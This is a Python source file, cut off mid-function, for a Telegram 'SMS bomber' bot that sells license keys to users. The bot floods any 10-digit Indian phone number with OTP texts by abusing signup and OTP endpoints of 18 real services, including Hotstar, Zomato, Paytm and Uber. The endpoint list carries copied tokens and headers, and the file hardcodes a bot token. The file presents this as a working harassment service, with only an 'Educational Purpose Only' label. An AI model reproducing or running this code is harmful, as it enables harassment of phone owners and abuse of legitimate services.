import os
import random
import time
import requests
import logging
import re
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Configuration ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')
OWNER_ID = int(os.environ.get('OWNER_ID', '1987818347'))
BOT_USERNAME = "@BeStChEaT_OwNeR"

# --- Database ---
DB_FILE = 'keys_db.json'

def load_db():
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'keys': {}, 'users': {}, 'blocked': []}

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=4)

# --- Key System ---
def generate_key():
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choice(chars) for _ in range(16))

def create_key(days=7, max_uses=100, is_premium=False):
    db = load_db()
    key = generate_key()
    db['keys'][key] = {
        'created': datetime.now().isoformat(),
        'expiry': (datetime.now() + timedelta(days=days)).isoformat(),
        'max_uses': max_uses,
        'used': 0,
        'users': [],
        'active': True,
        'is_premium': is_premium
    }
    save_db(db)
    return key

def validate_key(key, user_id):
    db = load_db()
    
    if key not in db['keys']:
        return False, "Invalid Key! Please check and try again."
    
    key_data = db['keys'][key]
    
    if not key_data['active']:
        return False, "This key has been blocked by admin!"
    
    expiry = datetime.fromisoformat(key_data['expiry'])
    if datetime.now() > expiry:
        return False, "Key has expired! Please get a new key."
    
    if key_data['used'] >= key_data['max_uses']:
        return False, "Key usage limit exceeded!"
    
    if str(user_id) not in key_data['users']:
        key_data['used'] += 1
        key_data['users'].append(str(user_id))
    
    if str(user_id) not in db['users']:
        db['users'][str(user_id)] = {
            'keys': [],
            'used_count': 0,
            'created': datetime.now().isoformat()
        }
    
    if key not in db['users'][str(user_id)]['keys']:
        db['users'][str(user_id)]['keys'].append(key)
    db['users'][str(user_id)]['used_count'] += 1
    
    save_db(db)
    return True, "Premium Access Activated!"

def block_key(key):
    db = load_db()
    if key in db['keys']:
        db['keys'][key]['active'] = False
        save_db(db)
        return True
    return False

def unblock_key(key):
    db = load_db()
    if key in db['keys']:
        db['keys'][key]['active'] = True
        save_db(db)
        return True
    return False

def delete_key(key):
    db = load_db()
    if key in db['keys']:
        del db['keys'][key]
        save_db(db)
        return True
    return False

def block_user(user_id):
    db = load_db()
    if str(user_id) not in db['blocked']:
        db['blocked'].append(str(user_id))
        save_db(db)
        return True
    return False

def unblock_user(user_id):
    db = load_db()
    if str(user_id) in db['blocked']:
        db['blocked'].remove(str(user_id))
        save_db(db)
        return True
    return False

def is_user_blocked(user_id):
    db = load_db()
    return str(user_id) in db['blocked']

def has_valid_key(user_id):
    db = load_db()
    user_id = str(user_id)
    
    if user_id in db['users']:
        for key in db['users'][user_id]['keys']:
            if key in db['keys']:
                key_data = db['keys'][key]
                if key_data['active']:
                    expiry = datetime.fromisoformat(key_data['expiry'])
                    if datetime.now() <= expiry and key_data['used'] < key_data['max_uses']:
                        return True
    return False

def is_premium_user(user_id):
    db = load_db()
    user_id = str(user_id)
    
    if user_id in db['users']:
        for key in db['users'][user_id]['keys']:
            if key in db['keys']:
                if db['keys'][key].get('is_premium', False):
                    return True
    return False

# --- SMS Bombing APIs (REAL WORKING - Like Termux) ---
def get_apis(target):
    apis = [
        # 1. Hotstar
        {
            'url': f'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
            'method': 'PUT',
            'headers': {
                'Host': 'api.hotstar.com',
                'content-length': '51',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'x-hs-platform': 'PCTV',
                'x-country-code': 'IN',
                'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                'hotstarauth': f'st={int(datetime.now().timestamp())}~exp={int(datetime.now().timestamp())+3600}~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
                'x-hs-appversion': '5.0.40',
                'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                'accept': '*/*',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/in/subscribe/sign-in',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"phone_number": target, "country_prefix": "91"}
        },
        # 2. AltBalaji
        {
            'url': 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN',
            'method': 'POST',
            'headers': {
                'Host': 'api.cloud.altbalaji.com',
                'Connection': 'keep-alive',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'X-API-KEY': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE',
                'Content-Type': 'application/json',
                'Origin': 'https://www.altbalaji.com',
                'Referer': 'https://www.altbalaji.com/user-detail?pid=NTU%3D',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "phone_number": target,
                "country_code": "91",
                "platform": "web",
                "exp": int((datetime.now().timestamp() + 3600) * 1000)
            }
        },
        # 3. Voot
        {
            'url': 'https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser',
            'method': 'POST',
            'headers': {
                'Host': 'us-central1-vootdev.cloudfunctions.net',
                'accept': 'application/json, text/plain, */*',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://www.voot.com',
                'referer': 'https://www.voot.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"type": "mobile", "mobile": target, "countryCode": "+91"}
        },
        # 4. SonyLIV
        {
            'url': 'https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP',
            'method': 'POST',
            'headers': {
                'Host': 'apiv2.sonyliv.com',
                'device_id': '5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120',
                'security_token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJ11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'accept': 'application/json, text/plain, */*',
                'session_id': f'cc86326a51504133bacd3ce4f796e1cf-{int(datetime.now().timestamp()*1000)}',
                'x-via-device': 'true',
                'app_version': '3.1.20',
                'origin': 'https://www.sonyliv.com',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "mobileNumber": target,
                "channelPartnerID": "MSMIND",
                "country": "IN",
                "timestamp": datetime.now().isoformat()
            }
        },
        # 5. Dream11
        {
            'url': 'https://www.dream11.com/graphql/mutation/pwa/register',
            'method': 'POST',
            'headers': {
                'Host': 'www.dream11.com',
                'accept': '*/*',
                'device': 'pwa',
                'x-csrf': 'fb1f1947-4547-392d-9a28-a9de30d9e766',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'origin': 'https://www.dream11.com',
                'referer': 'https://www.dream11.com/register?ru=',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
                "variables": {
                    "email": f"user{random.randint(1000,9999)}@gmail.com",
                    "mobileNumber": target,
                    "password": "tsunami@123astronomia"
                }
            }
        },
        # 6. Zomato
        {
            'url': 'https://www.zomato.com/webroutes/auth/login',
            'method': 'POST',
            'headers': {
                'Host': 'www.zomato.com',
                'content-type': 'application/json',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'x-zomato-csrft': 'a6b0c09972b2bdd30c9c1b6552caee5d',
                'origin': 'https://www.zomato.com',
                'referer': 'https://www.zomato.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
        },
        # 7. Grofers
        {
            'url': 'https://grofers.com/v2/accounts/',
            'method': 'POST',
            'headers': {
                'Host': 'grofers.com',
                'device_id': 'a11f656b-422e-4617-953b-c350d517467d',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'auth_key': '57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13',
                'app_client': 'consumer_web',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://grofers.com',
                'referer': 'https://grofers.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {'user_phone': target}
        },
        # 8. Oyo Rooms
        {
            'url': 'https://www.oyorooms.com/api/pwa/generateotp?locale=en',
            'method': 'POST',
            'headers': {
                'Host': 'www.oyorooms.com',
                'xsrf-token': 'vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'text/plain;charset=UTF-8',
                'origin': 'https://www.oyorooms.com',
                'referer': 'https://www.oyorooms.com/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"phone": target, "country_code": "+91", "nod": 4}
        },
        # 9. Zee5
        {
            'url': f'https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={target}',
            'method': 'GET',
            'headers': {
                'Host': 'b2bapi.zee5.com',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://www.zee5.com',
                'referer': 'https://www.zee5.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {}
        },
        # 10. Lenskart
        {
            'url': 'https://api.lenskart.com/v2/customers/sendOtp',
            'method': 'POST',
            'headers': {
                'Host': 'api.lenskart.com',
                'Content-Type': 'application/json;charset=UTF-8',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'x-api-client': 'mobilesite',
                'origin': 'https://www.lenskart.com',
                'referer': 'https://www.lenskart.com/customer/account/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"telephone": target}
        },
        # 11. Swiggy
        {
            'url': 'https://www.swiggy.com/mapi/auth/signup',
            'method': 'POST',
            'headers': {
                'Host': 'www.swiggy.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://www.swiggy.com',
                'referer': 'https://www.swiggy.com/auth/register',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "name": f"User{random.randint(1000,9999)}",
                "email": f"user{random.randint(1000,9999)}@gmail.com",
                "password": "Test@123456",
                "mobile": target,
            }
        },
        # 12. Paytm
        {
            'url': 'https://accounts.paytm.com/v2/api/register',
            'method': 'POST',
            'headers': {
                'Host': 'accounts.paytm.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://accounts.paytm.com',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "mobile": target,
                "email": f"user{random.randint(1000,9999)}@gmail.com",
                "scope": "paytm",
                "clientId": "paytm-web-secure",
                "loginPassword": "Test@123456",
            }
        },
        # 13. BookMyShow
        {
            'url': 'https://in.bookmyshow.com/pwa/api/uapi/otp/send',
            'method': 'POST',
            'headers': {
                'Host': 'in.bookmyshow.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://in.bookmyshow.com',
                'referer': f'https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber={target}',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "channel": "phone",
                "subChannel": "sms",
                "details": {"phone": target, "origin": "https://in.bookmyshow.com"}
            }
        },
        # 14. BigBasket
        {
            'url': 'https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/',
            'method': 'POST',
            'headers': {
                'Host': 'www.bigbasket.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'x-channel': 'BB-PWA',
                'x-csrftoken': 'gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED',
                'origin': 'https://www.bigbasket.com',
                'referer': 'https://www.bigbasket.com/auth/login/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"identifier": target}
        },
        # 15. RedBus
        {
            'url': f'https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined',
            'method': 'GET',
            'headers': {
                'Host': 'm.redbus.in',
                'accept': 'application/json, text/plain, */*',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://m.redbus.in/preregister',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {}
        },
        # 16. Flipkart
        {
            'url': 'https://1.rome.api.flipkart.com/1/action/view',
            'method': 'POST',
            'headers': {
                'Host': '1.rome.api.flipkart.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://www.flipkart.com',
                'referer': 'https://www.flipkart.com/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "actionRequestContext": {
                    "type": "LOGIN_IDENTITY_VERIFY",
                    "loginIdPrefix": "+91",
                    "loginId": target,
                    "loginType": "MOBILE",
                    "verificationType": "OTP",
                    "screenName": "LOGIN_V4_MOBILE",
                }
            }
        },
        # 17. Uber
        {
            'url': 'https://auth.uber.com/api/v1/signup',
            'method': 'POST',
            'headers': {
                'Host': 'auth.uber.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://www.uber.com',
                'referer': 'https://www.uber.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "phoneNumber": f"+91{target}",
                "countryCode": "IN",
                "password": "Test@123456",
                "firstName": f"User{random.randint(1000,9999)}"
            }
        },
        # 18. Ola
        {
            'url': 'https://accounts.olacabs.com/api/login',
            'method': 'POST',
            'headers': {
                'Host': 'accounts.olacabs.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://accounts.olacabs.com',
                'referer': 'https://accounts.olacabs.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "mobileNumber": target,
                "dialingCode": "+91",
                "countryCode": "IN"
            }
        }
    ]
    return apis

def send_sms(api_data):
    """Send SMS using API - Exactly like Termux"""
    try:
        if api_data['method'] == 'GET':
            response = requests.get(api_data['url'], headers=api_data['headers'], timeout=10)
        else:
            if isinstance(api_data['data'], dict):
                response = requests.request(
                    method=api_data['method'],
                    url=api_data['url'],
                    headers=api_data['headers'],
                    json=api_data['data'],
                    timeout=10
                )
            else:
                response = requests.request(
                    method=api_data['method'],
                    url=api_data['url'],
                    headers=api_data['headers'],
                    data=api_data['data'],
                    timeout=10
                )
        return response.status_code in [200, 201, 202, 204]
    except:
        return False

# --- Telegram Bot Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with Welcome Message"""
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    if is_user_blocked(user_id):
        await update.message.reply_text(
            "🚫 YOU HAVE BEEN BLOCKED!\n\n"
            "Contact @BeStChEaT_OwNeR for support."
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("📞 SEND NUMBER", callback_data="send_number")],
        [InlineKeyboardButton("🔑 GET KEY", callback_data="get_key")],
        [InlineKeyboardButton("👑 PREMIUM", callback_data="premium_info")],
        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")],
        [InlineKeyboardButton("📋 COMMANDS", callback_data="commands")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    premium_status = "⭐ PREMIUM USER ⭐" if is_premium_user(user_id) else "🔓 FREE USER"
    
    await update.message.reply_text(
        f"🔥 WELCOME TO SMS BOMBER 🔥\n\n"
        f"👤 User: {user_name}\n"
        f"🤖 Bot: @BeStChEaT_OwNeR\n"
        f"👑 Status: {premium_status}\n\n"
        f"⚡ Features:\n"
        f"✅ 18+ Working APIs\n"
        f"✅ Premium Quality Bombing\n"
        f"✅ 24/7 Service\n"
        f"✅ Unlimited Usage (Premium)\n\n"
        f"📌 How to Use:\n"
        f"1️⃣ Click SEND NUMBER button\n"
        f"2️⃣ Send your 10-digit number\n"
        f"3️⃣ Get instant results\n\n"
        f"🔑 Need Key? Click GET KEY button\n\n"
        f"💀 For Educational Purpose Only",
        reply_markup=reply_markup
    )

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Activate key command"""
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked! Contact @BeStChEaT_OwNeR")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "🔑 KEY ACTIVATION\n\n"
            "Usage: /key YOUR_KEY\n\n"
            "Example: /key AB7X9K2M5P3Q8R1T\n\n"
            "📌 Where to get key?\n"
            "Click GET KEY button or contact @BeStChEaT_OwNeR"
        )
        return
    
    key = args[0].upper().strip()
    valid, message = validate_key(key, user_id)
    
    if valid:
        is_premium = "⭐ PREMIUM ⭐" if is_premium_user(user_id) else "🔓 STANDARD"
        await update.message.reply_text(
            f"✅ KEY ACTIVATED SUCCESSFULLY!\n\n"
            f"🔑 Key: {key}\n"
            f"👑 Type: {is_premium}\n"
            f"📝 Status: {message}\n\n"
            f"🚀 You can now use the bot!\n"
            f"Send any 10-digit number to start bombing.\n\n"
            f"💀 @BeStChEaT_OwNeR"
        )
    else:
        await update.message.reply_text(
            f"❌ KEY ACTIVATION FAILED!\n\n"
            f"🔑 Key: {key}\n"
            f"❌ Reason: {message}\n\n"
            f"📌 Get a valid key from @BeStChEaT_OwNeR"
        )

async def commands_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show all commands"""
    user_id = update.effective_user.id
    
    if user_id == OWNER_ID:
        text = (
            "👑 OWNER COMMANDS\n\n"
            "🔑 Key Management:\n"
            "/create 7 100 - Create normal key\n"
            "/createpremium 30 999 - Create premium key\n"
            "/list - List all keys\n"
            "/block KEY - Block a key\n"
            "/unblock KEY - Unblock a key\n"
            "/delete KEY - Delete a key\n\n"
            "👤 User Management:\n"
            "/blockuser ID - Block user\n"
            "/unblockuser ID - Unblock user\n"
            "/users - List all users\n\n"
            "📊 Stats:\n"
            "/stats - Bot statistics\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    else:
        text = (
            "🤖 USER COMMANDS\n\n"
            "📌 Basic Commands:\n"
            "/start - Start the bot\n"
            "/key YOUR_KEY - Activate your key\n"
            "/commands - Show this menu\n"
            "/status - Check bot status\n\n"
            "📞 Bombing:\n"
            "Send any 10-digit number to bomb\n"
            "Example: 9876543210\n\n"
            "🔑 Need Key?\n"
            "Click GET KEY button\n"
            "or contact @BeStChEaT_OwNeR\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, reply_markup=reply_markup)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check bot status"""
    db = load_db()
    total_users = len(db['users'])
    total_keys = len(db['keys'])
    active_keys = sum(1 for k in db['keys'].values() if k['active'])
    blocked_users = len(db['blocked'])
    
    text = (
        f"🟢 BOT STATUS\n\n"
        f"🤖 Bot: @BeStChEaT_OwNeR\n"
        f"👑 Owner: @BeStChEaT_OwNeR\n"
        f"📡 Status: ✅ Online\n"
        f"⚡ APIs: 18+\n\n"
        f"📊 Statistics:\n"
        f"👥 Total Users: {total_users}\n"
        f"🔑 Total Keys: {total_keys}\n"
        f"✅ Active Keys: {active_keys}\n"
        f"🚫 Blocked Users: {blocked_users}\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, reply_markup=reply_markup)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number - REAL BOMBING FUNCTION"""
    user_id = update.effective_user.id
    
    # Check if user is blocked
    if is_user_blocked(user_id):
        await update.message.reply_text(
            "🚫 YOU HAVE BEEN BLOCKED!\n\n"
            "Contact @BeStChEaT_OwNeR for support."
        )
        return
    
    # Check if user has valid key
    if not has_valid_key(user_id):
        keyboard = [[InlineKeyboardButton("🔑 GET KEY", callback_data="get_key")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔑 NO VALID KEY FOUND!\n\n"
            "You need a valid key to use this bot.\n\n"
            "📌 How to get key:\n"
            "1️⃣ Click GET KEY button\n"
            "2️⃣ Contact @BeStChEaT_OwNeR\n"
            "3️⃣ Get your unique key\n\n"
            "🔄 Already have key?\n"
            "Use: /key YOUR_KEY",
            reply_markup=reply_markup
        )
        return
    
    phone = update.message.text.strip()
    
    # Check if it's a valid phone number
    if not re.match(r'^[0-9]{10}$', phone):
        await update.message.reply_text(
            "❌ INVALID NUMBER!\n\n"
            "Please send a valid 10-digit number.\n"
            "Example: 9876543210\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
        return
    
    # Premium or Normal
    is_premium = is_premium_user(user_id)
    bomb_text = "⭐ PREMIUM BOMBING ⭐" if is_premium else "📱 STANDARD BOMBING"
    
    # Send initial message with box
    msg = await update.message.reply_text(
        f"┌─────────────────────────┐\n"
        f"│     {bomb_text}     │\n"
        f"├─────────────────────────┤\n"
        f"│ 🎯 Target: +91{phone}        │\n"
        f"│ 📡 Status: STARTING...  │\n"
        f"│ ✅ Success: 0             │\n"
        f"│ ❌ Failed: 0              │\n"
        f"│ ⏳ Progress: 0%           │\n"
        f"└─────────────────────────┘"
    )
    
    # Get all APIs
    apis = get_apis(phone)
    random.shuffle(apis)
    
    # Limit based on premium
    max_apis = len(apis) if is_premium else 12
    
    # Send SMS
    success_count = 0
    failed_count = 0
    successful_services = []
    
    for i, api in enumerate(apis[:max_apis]):
        if send_sms(api):
            success_count += 1
            service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
            successful_services.append(service.capitalize())
        else:
            failed_count += 1
        
        # Update progress every 2 APIs
        if (i + 1) % 2 == 0:
            progress = int(((i + 1) / max_apis) * 100)
            try:
                await msg.edit_text(
                    f"┌─────────────────────────┐\n"
                    f"│     {bomb_text}     │\n"
                    f"├─────────────────────────┤\n"
                    f"│ 🎯 Target: +91{phone}        │\n"
                    f"│ 📡 Status: BOMBING...   │\n"
                    f"│ ✅ Success: {success_count}             │\n"
                    f"│ ❌ Failed: {failed_count}              │\n"
                    f"│ ⏳ Progress: {progress}%           │\n"
                    f"└─────────────────────────┘"
                )
            except:
                pass
    
    # Final result with box
    result_text = (
        f"┌─────────────────────────┐\n"
        f"│     ✅ BOMBING COMPLETE    │\n"
        f"├─────────────────────────┤\n"
